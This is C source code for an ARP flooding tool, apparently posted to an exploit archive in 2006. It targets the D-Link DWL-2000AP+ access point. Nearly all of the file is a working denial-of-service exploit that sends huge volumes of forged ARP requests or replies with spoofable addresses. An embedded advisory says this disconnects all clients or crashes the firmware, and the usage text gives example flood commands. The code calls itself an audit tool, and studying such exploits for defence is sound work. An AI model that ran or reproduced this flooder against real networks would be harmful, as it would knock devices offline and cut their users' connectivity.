/* 

ARP FLOODER v0.1 - poplix@papuasia.org  -  2006-12-04 
designed to crash D-LINK DWL-2000AP+

compile with: gcc arpflood.c -o arpflood


*/



#define _BSD_SOURCE 1
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <fcntl.h>
#include <errno.h>


#include <sys/ioctl.h>
#include <sys/param.h>//param.h defines BSD in bsd systems 
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/sysctl.h>

#include <net/if.h>
#include <net/if_arp.h>
#include <net/route.h>

#ifdef BSD
#include <net/if_dl.h>
 #include <net/bpf.h>
#endif


#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/in_systm.h>
#include <ifaddrs.h>



#ifdef BSD
#include <unistd.h>
#include <net/if_types.h>
#endif


#ifdef __linux__
#include <net/if_arp.h>
#include <linux/if_packet.h>
#endif

#ifndef DLT_EN10MB
#define DLT_EN10MB	1
#endif

#ifndef DLT_LOOP
#define DLT_LOOP	10
#endif

#ifndef DLT_PPP
#define DLT_PPP		9
#endif

#define ETHADDR_SIZE 6
#define ETHHDR_SIZE 14
#define ETHTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806





#define SMALLOC(x,y){x=(y*)malloc(sizeof(y));\
						if( x == NULL){printf("malloc out of memory");\
						exit(9);}\
					}



#define CALLOC(x,y,z){ x=(y*)calloc(z,sizeof(y));if(x==NULL){\
	printf("calloc out of memory\n");\
	exit(9);}}

#define SSTRNCPY(dst,src,len){strncpy(dst,src,len-1); dst[len-1]=0;}
#define SSTRNCAT(dst,src,len)strncat(dst,src, len - strlen(dst) - 1);





#define ETHARP_PKT_SIZE 42 // eth + arpfixedsize + addresses size


#define FTYPE_REQ 1
#define FTYPE_REPLY 2




struct intf{
	char name[12];
	u_int index;
	int fd;
	u_int mtu;
	u_int type;
	
	u_int32_t ipaddr;
	u_int32_t netmask;
	
	u_char  l2addr[6];
	u_int	l2addr_size;
	u_int	l2hdr_size;
	
};




struct intf out_intf;




u_int ip_to_int(char *ip, int *err){
  char *inv,*s;
  u_char ret[4];
  int a;
  u_int tmp;
	
	if(ip == NULL || strlen(ip) < 7) return 0;
	s=ip;
	for( a=0; a < 4; a++){
  		tmp=strtoul(s,&inv,10);
  		if( (*inv != '.' && *inv!=0) || tmp < 0 || tmp > 255 ) {
  			if(err != NULL)*err=1;
  			return 0;
  		}
  		ret[a]=tmp;
  		s=++inv;
	}
	
	if(err != NULL)*err=0;
	return *((u_int*)ret);

}


int str_to_macaddr(char *str, u_char *dst){
  char *inv,*s;
  int a;
  u_int tmp;
	
	if(str == NULL || strlen(str) < 11) return 0;
	s=str;
	for( a=0; a < 6; a++){
  		tmp=strtoul(s,&inv,16);
  		if( (*inv != ':' && *inv!=0) || tmp < 0x00 || tmp > 0xff ) 
  			return 0;
  		
  		dst[a]=tmp;
  		s=++inv;
	}
	
	
	return 1;

}



char *int_to_ip(u_int32_t ip){
	u_char *tmp=(u_char *)&ip;
	static char ret[16];
	memset(ret,0,sizeof(ret));
	sprintf(ret,"%u.%u.%u.%u",tmp[0] & 0xff,tmp[1] & 0xff,tmp[2] & 0xff,tmp[3] & 0xff);
	return ret;
	
}


char *macaddr_to_str(u_char *mac){
	static char ret[18];
	memset(ret,0,sizeof(ret));
	sprintf(ret,"%02x:%02x:%02x:%02x:%02x:%02x",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
	return ret;
	
}








int build_ether_hdr(u_char *dst, u_char* src,u_short type,u_char* dstbuff){
  memcpy(dstbuff,dst,ETHADDR_SIZE);
  memcpy(dstbuff+6,src,ETHADDR_SIZE);
  
  *( (u_short*)(dstbuff+12) ) = htons(type);
  
  return 1;
	
}




int build_arp_hdr(u_char *hdst,u_int32_t pdst,u_char* hsrc,u_int32_t psrc,u_short arpop,u_char* dstbuff){
  struct arphdr* hdr= (struct arphdr*)dstbuff;
  u_int off;
  
	hdr->ar_hrd=htons(ARPHRD_ETHER);
  	hdr->ar_pro=htons(ETHTYPE_IP);
  	hdr->ar_hln=ETHADDR_SIZE;
  	hdr->ar_pln=4;
  	hdr->ar_op=htons(arpop);
  	
  	off=8;
  	
  	memcpy(dstbuff + off,hsrc,ETHADDR_SIZE);
	off+=ETHADDR_SIZE;
	
	memcpy(dstbuff + off,(u_char*)&psrc,4);
	off+=4,
	
  	memcpy(dstbuff + off,hdst,ETHADDR_SIZE);
  	off+=ETHADDR_SIZE;
  	
	memcpy(dstbuff + off,(u_char*)&pdst,4);
  	
  	return 1;
}



int arp_request(u_int32_t ripaddr,u_int32_t ipsrc,u_char *macsrc){
  u_char arpbuff[ETHARP_PKT_SIZE]; 

	if(macsrc==NULL)macsrc=out_intf.l2addr;
	if(ipsrc==0)ipsrc=out_intf.ipaddr;
	build_ether_hdr((u_char*)"\xff\xff\xff\xff\xff\xff",macsrc,ETHERTYPE_ARP,arpbuff);
	
	build_arp_hdr((u_char*)"\x0\x0\x0\x0\x0\x0",
					ripaddr,
					macsrc,
					ipsrc,
					ARPOP_REQUEST,
					arpbuff + ETHHDR_SIZE
					);
					
	write_link(&out_intf,arpbuff,sizeof(arpbuff));

	return 1;
}




int arp_reply(u_int32_t ipdst,u_char *dstmac,u_int32_t ipsrc,u_char *srcmac){
   u_char arpbuff[ETHHDR_SIZE + ETHARP_PKT_SIZE];
	
	if(srcmac==NULL)srcmac=out_intf.l2addr;
	
	build_ether_hdr(dstmac, srcmac, ETHERTYPE_ARP, arpbuff);
	build_arp_hdr(dstmac, ipdst, srcmac, ipsrc, ARPOP_REPLY, arpbuff+ETHHDR_SIZE);
	write_link(&out_intf,arpbuff,sizeof(arpbuff));

	return 1;
}




#ifdef BSD

int getifinfo(char *name,struct intf *iface){
   struct ifaddrs *ifap, *ifa;
   int find=0;
	
   int mib[]={CTL_NET,AF_ROUTE,0,AF_LINK,NET_RT_IFLIST,0};
   size_t len;
   u_char *buff, *next, *end;
   struct if_msghdr *ifm;
   struct sockaddr_dl *sdl;


	// get the list 
	if(getifaddrs(&ifap) < 0) return 0;
	
	if(!ifap) return 0; 
	//nota che ogni inf compare due volte in lista, una volta come AF_LINK e una AF_INET
	for(ifa = ifap; ifa; ifa = ifa->ifa_next)
	 if(!strcmp(name,ifa->ifa_name)){
	 	//copy only the first time
	 	if(find==0){
	 		memset(iface->name,0,sizeof(iface->name));
	 		SSTRNCPY(iface->name,name,sizeof(iface->name));
	 	}
	 	find=1;
		if(ifa->ifa_addr->sa_family == AF_LINK){
			iface->mtu=((struct if_data*)ifa->ifa_data)->ifi_mtu;
			
			switch(((struct if_data*)ifa->ifa_data)->ifi_type){
				case IFT_ETHER:
					iface->type=DLT_EN10MB;
					iface->l2hdr_size=ETHHDR_SIZE;
					break;
				case IFT_GIF:
				case IFT_LOOP:
					iface->type=DLT_LOOP;
					iface->l2hdr_size=0;
					break;
				case IFT_PPP:
					iface->type = DLT_PPP;
				default:
					freeifaddrs(ifap);
					return 0;
			}
			
		}
		if(ifa->ifa_addr->sa_family == AF_INET){
			iface->ipaddr  = (u_int32_t) ((struct sockaddr_in*)ifa->ifa_addr)->sin_addr.s_addr;
			iface->netmask = (u_int32_t) ((struct sockaddr_in*)ifa->ifa_netmask)->sin_addr.s_addr;
		}
	  }
		
	freeifaddrs(ifap);
	
	//get hardware address
	if (sysctl(mib, ETHADDR_SIZE, NULL, &len, NULL, 0) == -1){
		printf("getting hardware address\n");
		exit(1);
	}

    CALLOC(buff,u_char,len);
    if (sysctl(mib, ETHADDR_SIZE, buff, &len, NULL, 0) < 0){
        free(buff);
        printf("getting hardware address\n");
        exit(1);
    }
    end = buff + len;

    for (next = buff ; next < end ; next += ifm->ifm_msglen){
        ifm = (struct if_msghdr *)next;
        if (ifm->ifm_type == RTM_IFINFO){
            sdl = (struct sockaddr_dl *)(ifm + 1);
            if (strncmp(&sdl->sdl_data[0], iface->name, sdl->sdl_nlen) == 0){
                memcpy(iface->l2addr,LLADDR(sdl),ETHADDR_SIZE);
                break;
            }
        }
    }
    free(buff);

	iface->index=0; // dont care
	
	return find;
	

 }
 
 
//int wrink(u_int fd,u_char *frame, u_int size){
int write_link(struct intf *iface,u_char *frame, u_int size){
    int c;
	
    if (iface->fd < 0){
    	printf("%s\n","bpf error");
    	exit(2);
    }
    c = write(iface->fd, frame, size);
    
    if (c != size){
    	printf("error writing to bpf,, written:%d bytes\n",c);
    	exit(3);
    }

    return (c);
}


int open_link(char* ifname){
   int i, fd;
   char devname[12];
   struct ifreq ifr;
    
    for (i=0; i<100; i++){
        sprintf(devname, "/dev/bpf%u", i);
        fd = open(devname, O_RDWR);
        if (fd == -1 && errno == EBUSY)
            continue;
        else
        	break;
    }

    if (fd == -1){
        printf("unable to open bpf\n");
        exit(4);
    }

    
	SSTRNCPY(ifr.ifr_name, ifname, sizeof(ifr.ifr_name));
    
    if (ioctl(fd, BIOCSETIF, (caddr_t)&ifr) == -1){
       printf("attaching interface to bpf\n");
       exit(4);
    }
    
    
    return (fd);
}

 
#endif
//end of BSD code



#ifdef __linux__
 //fetifinfo sets:ifname, mtu, link-type,layer4 address,layer4 netmask, 
 
int getifinfo(char *name,struct intf *iface){
   int fd,find=0;
   struct ifconf   ifc;
   struct ifreq    ibuf[16], ifr, *ifrp, *ifend;
   struct sockaddr_in sa;
        
	
	
	
	if ( (fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) return 0;
	
	memset(ibuf, 0, sizeof(struct ifreq)*16);
	ifc.ifc_len = sizeof(ibuf);
	ifc.ifc_buf = (caddr_t) ibuf;
	
	/* gets interfaces list */
	if ( ioctl(fd, SIOCGIFCONF, (char*)&ifc) == -1 ||
		 ifc.ifc_len < sizeof(struct ifreq)         ) 
		 	goto bad;
	
	/* ifrp points to buffer and ifend points to buffer's end */
	ifrp = ibuf;
	ifend = (struct ifreq*) ((char*)ibuf + ifc.ifc_len);
	
	for (; ifrp < ifend; ifrp++) {
		if(strcmp(ifrp->ifr_name,name))continue;
		find=1;
		SSTRNCPY(ifr.ifr_name, ifrp->ifr_name, sizeof(ifr.ifr_name));
		
		//get if flags
		if(ioctl(fd, SIOCGIFFLAGS, (char*)&ifr) == -1)
			goto bad;
			
		//if is down
		if ( !(ifr.ifr_flags & IFF_UP) )goto bad;
	
		SSTRNCPY(iface->name, ifr.ifr_name, sizeof(iface->name));
		
		//get l3 addr
		if (ioctl(fd, SIOCGIFADDR, (char*)&ifr) == -1)goto bad;
			
		if (ifr.ifr_ifru.ifru_addr.sa_family == AF_INET) {
			//save addr
			iface->ipaddr=((struct sockaddr_in *)&ifr.ifr_ifru.ifru_addr)->sin_addr.s_addr;
			
			//get netmask
			if(ioctl(fd, SIOCGIFNETMASK, (char*)&ifr) == -1)goto bad;
			iface->netmask=((struct sockaddr_in *)&ifr.ifr_ifru.ifru_netmask)->sin_addr.s_addr;
		 	
		 	//get index
		 	if (ioctl(fd, SIOCGIFINDEX, (char*)&ifr) == -1)goto bad;
		 	iface->index=ifr.ifr_ifindex;
		 	
			//get link-type
			if(ioctl(fd, SIOCGIFHWADDR, (char*)&ifr) == -1)goto bad;
			switch (ifr.ifr_hwaddr.sa_family) {
				//__linux__ encaps loop in eth frames
				case ARPHRD_LOOPBACK:
				case ARPHRD_ETHER:
				case ARPHRD_METRICOM:
					iface->type = DLT_EN10MB;
					iface->l2hdr_size=ETHHDR_SIZE;
					break;
				case ARPHRD_PPP:
				default: 
					goto bad;
			}
		}else goto bad;
		//get MTU
		if(ioctl(fd, SIOCGIFMTU, &ifr) == -1)goto bad;
		iface->mtu=ifr.ifr_mtu;               
	}
	
	close(fd);
	return 1;
	
   bad:
   close(fd);
   printf("%s\n","getting interface infos");
   exit(5);
  }
  
  
int write_link(struct intf *iface,u_char *frame, u_int size){
   int c;
   struct sockaddr_ll sa;
    
	memset(&sa, 0, sizeof (sa));
	
	sa.sll_family    = AF_PACKET;
	sa.sll_ifindex   = iface->index;
	sa.sll_protocol  = htons(ETH_P_ALL);
	
	c = sendto(iface->fd, frame, size, 0, (struct sockaddr *)&sa, sizeof (sa));
	
	if (c != size){
		printf("error writing to bpf,, written:%d bytes\n",c);
		exit(6);
	}
	return (c);
}
 
 

int open_link(char *ifname){
    struct ifreq ifr;
    int n = 1,fd;


    fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (fd == -1){
    	printf("opening link %s",ifname);
    	exit(7);
    }

    memset(&ifr, 0, sizeof (ifr));
    
    SSTRNCPY(ifr.ifr_name,ifname,sizeof (ifr.ifr_name));
    
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0 ){
		printf("%s\n","SIOCGIFHWADDR");
		exit(7);
	}


#ifdef SO_BROADCAST
/*
 * man 7 socket
 *
 * Set or get the broadcast flag. When  enabled,  datagram  sockets
 * receive packets sent to a broadcast address and they are allowed
 * to send packets to a broadcast  address.   This  option  has  no
 * effect on stream-oriented sockets.
 */
    if (setsockopt(fd, SOL_SOCKET, SO_BROADCAST, &n, sizeof(n)) == -1){
    	printf("set sock opt: SO_BROADCAST");
    	exit(7);
    }
    	
#endif  /*  SO_BROADCAST  */

    return fd;


}

 
 
 #endif  //linux
 
 
void adv(){

	printf( "D-LINK DWL-2000AP+ with firmware version 2.11 is prone to two remote denial\n\
of service vulnerability because it fails to handle arp flooding. \n\
The first vuln causes the wireless link (802.11) to be resetted and the arp \n\
table to be rebuilded. All clients connected to the AP are disconnected.\n\
This bug can be triggered by sending lots of arp replies through the wired link\n\
or the radio one at a very high speed.\n\
The second vulnerability affects the wireless link only and are quite harder\n\
to trigger but causes the AP firmware to crash making a manual reboot mandatory.\n\
This bug can be triggered only if no other D-LINK ethernet products are visible \n\
to AP, if wep encryption is enabled and it needs a very large amount of\n\
arp-requests to be broadcasted through its wireless link at a very high speed. \n\
This exploit works in the 90%% of cases because sometimes the AP is able to ban\n\
the flooding client before the exploiting process is complete.\n\
D-LINK doesn't support this product anymore so no solution is available.\n\
Other products can be vulnerable.\n\
\n\
Not vulnerable: DWL-700AP\n\n");


	exit(0);
}
 
void info(char *pname){
	printf( "\nThis program has been written to audit some D-LINK ethernet products\n"
				"cuz it seems that some D-LINK AP will freeze if arp flooded\n\n"
			"At the this time only D-LINK DWL-2000AP+ is reported to be vulnerable so\n"
				"a good idea is to test other products...\n\n"
			"Test 1: it makes the AP to disconnect all connected clients\n"
			"         a quik flood with arp-replies is sufficent to trigger this vuln\n"
			"         %s REPLY en1 @ @ 10.0.0.140 900000 0 00:de:09:a1:bb:c7\n\n"
			"Test 2: it makes the AP firmware to crash making a manual reboot mandatory\n"
			"         a flood with a large amount of arp-requests\n"
			"         %s REQ en1 @ @ 10.0.0.140 9000000 0\n"
			,pname,pname);
			
	exit(0);
}


void usage(char *pname){
	printf( "usage:\n  %s info or advisory \nor\n  %s <REQ/REPLY> <intf> <srcMAC> <srcIP> <queryIP> <nr of pkts> <delay in ms> [<dstMAC>]\n"
			"if srcMAC or srcIP is equal to '@' your own MAC/IP address will be used\n"
			,pname,pname);
	exit(0);

}



main(int argc, char **argv){

 	int pktnr,a,c,ftype,err,delay;
	u_char *srcmac,dstmac[6];
	u_int32_t srcip,dstip;
	char *inv;

	if( argc < 2 )usage(argv[0]);
	if(*argv[1]=='i')info(argv[0]);
	if(*argv[1]=='a')adv();	
	if(argc < (  (!strcmp(argv[1],"REQ")) ? 8 : 9  ) ) usage(argv[0]);
	
	if(!getifinfo(argv[2],&out_intf)){
		printf("error opening interface %s\n",argv[2]);
		exit(2);
	}
	
	

	
	out_intf.fd=open_link(out_intf.name);
	


	printf("ARP FLOODER v0.1  by poplix  -  poplix@papuasia.org  -  2006-12-09\n"
			"written in a very few hours by taking pieces of code from some of mine ancient projects\n\n"
			"\nflooding on %s, ",argv[2]);

	
	if(!strcmp(argv[1],"REQ")){
		printf("flood type: REQ, ");
		ftype=FTYPE_REQ;
	} else {
		printf("flood type: REPLY, ");
		ftype=FTYPE_REPLY;	
	}
	
	if(*argv[3] != '@'){
	  SMALLOC(srcmac,u_char);
	  if(!str_to_macaddr(argv[3],srcmac)){
		printf("\nerror while parsing srcmac: %s\n",argv[3]);
		exit(2);
	  }
	} else
		srcmac=out_intf.l2addr;
		
	printf(" srcMAC: %s, ",macaddr_to_str(srcmac));

	
	if(ftype== FTYPE_REPLY && !str_to_macaddr(argv[8],dstmac)){
		printf("\nerror while parsing dstmac: %s\n",argv[8]);
		exit(2);
	} 
	if(ftype==FTYPE_REPLY) 
		printf("dstMAC: %s, ",argv[8]);
	
	
	if(*argv[4] != '@'){
		ip_to_int(argv[4],&err);
		if(err){
			printf("\nerror while parsing srcip: %s\n",argv[4]);
			exit(2);
		}
	} else
		srcip=out_intf.ipaddr;
	printf("srcIP: %s, ",int_to_ip(srcip));
	
	
	dstip=ip_to_int(argv[5],&err);
	if(err){
		printf("\nerror while parsing dstip: %s\n",argv[5]);
		exit(2);
	} 
	printf("dstIP: %s, ",argv[5]);

	
	
	pktnr=strtoul(argv[6],&inv,10);
	if(*inv != 0){
		printf("\nerror while parsing pkts number: %s\n",argv[6]);
		exit(1);
	}
	printf("pkts: %u, ",pktnr);

	
	delay=(strtoul(argv[7],&inv,10) * 1000);
	if(*inv != 0){
		printf("\nerror while parsing delay: %s\n",argv[6]);
		exit(1);
	}
	printf("delay: %u ms\n",delay/1000);
	printf("\nflooding...\n> 0");
	fflush(stdout);
	
	
 	for(a=0;a<pktnr;a++){
		
 		if( (delay == 0 && (a%2048) == 0) || ( delay >0 && (a%128) == 0)  ){
 			printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b> %u",a);
 			fflush(stdout);
		}
 		if(ftype==FTYPE_REQ)
			arp_request(dstip,srcip,srcmac);
		else
			arp_reply(dstip,dstmac,srcip,srcmac); 
			
		if(delay>0)usleep(delay);
	}

	printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b> %u",pktnr);
	printf("\ndone\n");
	close(out_intf.fd);
	exit(0);
}

// milw0rm.com [2006-12-11]
